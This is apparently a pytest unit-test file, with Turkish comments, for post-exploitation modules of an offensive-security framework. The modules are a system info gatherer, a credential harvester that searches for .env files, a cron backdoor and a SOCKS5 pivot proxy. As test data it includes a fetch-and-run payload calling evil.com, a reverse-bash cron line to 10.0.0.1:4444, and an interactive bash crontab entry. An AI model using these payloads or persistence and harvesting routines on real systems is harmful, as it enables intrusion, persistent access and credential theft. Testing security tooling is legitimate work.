# =============================================================================
# Post-Exploitation Modülleri — Birim Testleri
# =============================================================================

import pytest
import os
import sys
from unittest.mock import MagicMock, patch, mock_open

# ── System Info ──────────────────────────────────────────────────────────────
from modules.post.gather.system_info import system_info

# ── Credentials ──────────────────────────────────────────────────────────────
from modules.post.gather.credentials import credentials

# ── Cron Backdoor ────────────────────────────────────────────────────────────
from modules.post.persist.cron_backdoor import cron_backdoor

# ── SOCKS Proxy ──────────────────────────────────────────────────────────────
from modules.post.pivot.socks_proxy import socks_proxy


# =============================================================================
# TestSystemInfo
# =============================================================================
class TestSystemInfo:
    @pytest.fixture
    def mod(self):
        return system_info()

    def test_init_metadata(self, mod):
        assert mod.Name == "System Information Gatherer"
        assert mod.Category == "post/gather"
        assert mod.Version == "1.0"

    def test_init_options(self, mod):
        assert "SHOW_PROCESSES" in mod.Options
        assert "PROCESS_COUNT" in mod.Options
        assert "SHOW_NETWORK" in mod.Options
        assert "SHOW_DISK" in mod.Options

    def test_bytes_to_human(self, mod):
        assert "KB" in mod._bytes_to_human(2048)
        assert "MB" in mod._bytes_to_human(1048576)
        assert "B" in mod._bytes_to_human(512)

    def test_seconds_to_human(self, mod):
        assert "dakika" in mod._seconds_to_human(300)
        assert "saat" in mod._seconds_to_human(7200)
        assert "gün" in mod._seconds_to_human(90000)

    @patch("modules.post.gather.system_info.psutil")
    def test_run_returns_true(self, mock_psutil, mod):
        # cpu
        mock_psutil.cpu_count.return_value = 4
        mock_psutil.cpu_percent.return_value = 25.0
        mock_freq = MagicMock()
        mock_freq.current = 2400.0
        mock_psutil.cpu_freq.return_value = mock_freq
        # ram
        mock_mem = MagicMock()
        mock_mem.total = 8 * 1024**3
        mock_mem.used = 4 * 1024**3
        mock_mem.available = 4 * 1024**3
        mock_mem.percent = 50.0
        mock_psutil.virtual_memory.return_value = mock_mem
        # disk
        mock_psutil.disk_partitions.return_value = []
        # network
        mock_psutil.net_if_addrs.return_value = {}
        mock_psutil.net_if_stats.return_value = {}
        # processes
        mock_psutil.process_iter.return_value = []
        # uptime
        mock_psutil.boot_time.return_value = 1700000000.0
        # AF_LINK
        mock_psutil.AF_LINK = 18

        options = {
            "SHOW_PROCESSES": "true",
            "PROCESS_COUNT": 5,
            "SHOW_NETWORK": "true",
            "SHOW_DISK": "true",
        }
        result = mod.run(options)
        assert result is True


# =============================================================================
# TestCredentials
# =============================================================================
class TestCredentials:
    @pytest.fixture
    def mod(self):
        return credentials()

    def test_init_metadata(self, mod):
        assert mod.Name == "Credential Harvester"
        assert mod.Category == "post/gather"

    def test_init_options(self, mod):
        assert "TARGET_DIR" in mod.Options
        assert "SEARCH_DEPTH" in mod.Options
        assert "SHOW_CONTENT" in mod.Options
        assert "PREVIEW_LINES" in mod.Options

    def test_expand_path_tilde(self, mod):
        expanded = mod._expand_path("~/test")
        assert "~" not in expanded
        assert "test" in expanded

    def test_check_known_files_returns_list(self, mod):
        results = mod._check_known_files()
        assert isinstance(results, list)
        # Her eleman 4 elemanlı tuple olmalı
        for item in results:
            assert len(item) == 4

    @patch("os.walk")
    def test_find_env_files(self, mock_walk, mod):
        mock_walk.return_value = [
            ("/tmp/project", ["subdir"], [".env", "app.py"]),
            ("/tmp/project/subdir", [], [".env.local"]),
        ]
        found = mod._find_env_files("/tmp/project", 3)
        assert len(found) == 2
        assert any(".env" in f for f in found)

    def test_run_returns_true(self, mod):
        options = {
            "TARGET_DIR": "/tmp/nonexistent_dir_xyz",
            "SEARCH_DEPTH": 1,
            "SHOW_CONTENT": "false",
            "PREVIEW_LINES": 3,
        }
        result = mod.run(options)
        assert result is True


# =============================================================================
# TestCronBackdoor
# =============================================================================
class TestCronBackdoor:
    @pytest.fixture
    def mod(self):
        return cron_backdoor()

    def test_init_metadata(self, mod):
        assert mod.Name == "Cron Backdoor"
        assert mod.Category == "post/persist"

    def test_init_options(self, mod):
        assert "ACTION" in mod.Options
        assert "LHOST" in mod.Options
        assert "LPORT" in mod.Options
        assert "SCHEDULE" in mod.Options
        assert "PAYLOAD_TYPE" in mod.Options
        assert "PAYLOAD_CMD" in mod.Options

    def test_build_payload_reverse_bash(self, mod):
        opts = {"LHOST": "10.0.0.1", "LPORT": "4444", "SCHEDULE": "*/5 * * * *",
                "PAYLOAD_TYPE": "reverse_bash"}
        line = mod._build_payload_line(opts)
        assert "10.0.0.1" in line
        assert "4444" in line
        assert "/bin/bash" in line
        assert "# MAH-PERSIST" in line

    def test_build_payload_custom(self, mod):
        opts = {"PAYLOAD_TYPE": "custom", "PAYLOAD_CMD": "curl http://evil.com/s | sh",
                "SCHEDULE": "0 * * * *"}
        line = mod._build_payload_line(opts)
        assert "curl" in line
        assert "# MAH-PERSIST" in line

    def test_build_payload_missing_lhost(self, mod):
        opts = {"LHOST": "", "PAYLOAD_TYPE": "reverse_bash", "SCHEDULE": "* * * * *"}
        line = mod._build_payload_line(opts)
        assert line == ""

    @patch.object(cron_backdoor, "_get_crontab", return_value="")
    def test_action_list_empty(self, mock_crontab, mod):
        result = mod._action_list()
        assert result is True

    @patch.object(cron_backdoor, "_get_crontab",
                  return_value="*/5 * * * * /bin/bash -c 'bash -i' # MAH-PERSIST\n0 * * * * /usr/bin/backup\n")
    def test_action_list_with_entries(self, mock_crontab, mod):
        result = mod._action_list()
        assert result is True

    @patch.object(cron_backdoor, "_set_crontab", return_value=True)
    @patch.object(cron_backdoor, "_get_crontab", return_value="0 * * * * /usr/bin/backup\n")
    def test_action_add_success(self, mock_get, mock_set, mod):
        opts = {"LHOST": "10.0.0.1", "LPORT": "4444", "SCHEDULE": "*/5 * * * *",
                "PAYLOAD_TYPE": "reverse_bash"}
        result = mod._action_add(opts)
        assert result is True
        mock_set.assert_called_once()

    @patch.object(cron_backdoor, "_get_crontab",
                  return_value="*/5 * * * * cmd # MAH-PERSIST\n")
    def test_action_add_duplicate(self, mock_get, mod):
        opts = {"LHOST": "10.0.0.1", "LPORT": "4444", "SCHEDULE": "*/5 * * * *",
                "PAYLOAD_TYPE": "reverse_bash"}
        result = mod._action_add(opts)
        assert result is False

    @patch.object(cron_backdoor, "_set_crontab", return_value=True)
    @patch.object(cron_backdoor, "_get_crontab",
                  return_value="0 * * * * backup\n*/5 * * * * evil # MAH-PERSIST\n")
    def test_action_remove(self, mock_get, mock_set, mod):
        result = mod._action_remove()
        assert result is True
        written = mock_set.call_args[0][0]
        assert "MAH-PERSIST" not in written
        assert "backup" in written


# =============================================================================
# TestSocksProxy
# =============================================================================
class TestSocksProxy:
    @pytest.fixture
    def mod(self):
        return socks_proxy()

    def test_init_metadata(self, mod):
        assert mod.Name == "SOCKS5 Proxy"
        assert mod.Category == "post/pivot"

    def test_init_options(self, mod):
        assert "BIND_HOST" in mod.Options
        assert "BIND_PORT" in mod.Options
        assert "AUTH" in mod.Options
        assert "USERNAME" in mod.Options
        assert "PASSWORD" in mod.Options
        assert "TIMEOUT" in mod.Options
        assert "MAX_CLIENTS" in mod.Options

    def test_initial_state(self, mod):
        assert mod._running is False
        assert mod._server_socket is None
        assert mod._stats["connections"] == 0

    @patch("socket.socket")
    def test_start_server_bind_error(self, mock_socket_cls, mod):
        """Port zaten kullanımdaysa hata vermeli."""
        mock_sock = MagicMock()
        mock_sock.bind.side_effect = OSError("Address already in use")
        mock_socket_cls.return_value = mock_sock

        mod._start_server("0.0.0.0", 1080, False, "", "", 5, 10)
        assert mod._running is False

    def test_stop_server_cleans_up(self, mod):
        mock_sock = MagicMock()
        mod._server_socket = mock_sock
        mod._running = True
        mod._stop_server()
        assert mod._running is False
        assert mod._server_socket is None
        mock_sock.close.assert_called_once()
